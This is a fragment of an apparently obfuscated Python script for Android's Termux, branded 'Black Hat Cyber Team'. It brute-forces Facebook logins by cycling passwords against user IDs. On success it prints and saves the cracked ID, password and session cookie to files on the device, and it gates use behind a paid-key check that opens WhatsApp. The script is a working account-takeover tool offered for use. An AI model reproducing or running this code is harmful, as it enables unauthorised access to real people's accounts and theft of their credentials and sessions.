...
\x1b[1;97m[+]==============================================[+]
\x1b[1;91m[+] CREATED BY   :  Black Hat Cyber Team
\x1b[1;92m[+] ON FACEBOK   :  Tajul Islam Rabbi
\x1b[1;93m[+] ON GITHUB    :  Hacker1414
\x1b[1;94m[+] TOOL STATUS  :  Apnader Jorno Free Kore Delam Rabbi
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[RABBI-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                sn4gdh9('/sdcard/RABBI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                sn4gdh9('/sdcard/RABBI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def reg():
    ...
    r = requests.get('https://github.com/MrDevilEx/gift/blob/main/paidapvd.txt').text
    if to in r:
        os.system('clear')
        ...
        os.system('am start https://wa.me/+8801814032575?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20snigdho%20Paid%20Tools.%20My%20Key:%20'+id+snigdho)
        reg()
...
def reg2():
    ...
    os.system('am start https://wa.me/+8801814032575?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20snigdho=MEX%20Paid%20Tools.%20My%20Key:%20'+id+snigdho)
